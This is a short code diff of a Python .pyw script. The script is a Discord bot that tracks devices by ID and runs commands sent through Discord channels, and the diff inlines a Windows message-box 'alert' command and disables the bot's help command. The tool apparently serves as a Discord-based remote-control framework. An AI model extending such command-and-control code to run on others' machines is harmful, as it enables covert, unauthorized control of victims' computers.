@@ -54,11 +54,7 @@ if os.path.exists(device_id_path):
     # Move device_id.txt to the same folder as the .pyw file
     shutil.move(device_id_path, os.path.join(script_dir, device_id_path))
 
-# Alert message on Windows
-def show_alert(message):
-    def _thread_alert():
-        ctypes.windll.user32.MessageBoxW(0, message, "Alert", 0x40 | 0x1)
-    threading.Thread(target=_thread_alert).start()
+
 
 # Load token and prefix
 TOKEN, COMMAND_PREFIX = load_config()
@@ -69,7 +65,7 @@ if not TOKEN or not COMMAND_PREFIX:
 intents = discord.Intents.default()
 intents.message_content = True
 
-bot = commands.Bot(command_prefix=COMMAND_PREFIX, intents=intents)
+bot = commands.Bot(command_prefix=COMMAND_PREFIX, intents=intents, help_command=None)
 device_id = get_device_id()
 device_category = None
 commands_channel = None
@@ -123,7 +119,11 @@ async def ping(ctx):
 async def alert(ctx, *, message: str):
     if ctx.channel.category.name != device_id:
         return
-    show_alert(message)
+
+    def _thread_alert():
+        ctypes.windll.user32.MessageBoxW(0, message, "Alert", 0x40 | 0x1)
+    threading.Thread(target=_thread_alert).start()
+
     embed = discord.Embed(
         title=":white_check_mark: Alert Sent",
         description=f"Alert message: {message}",
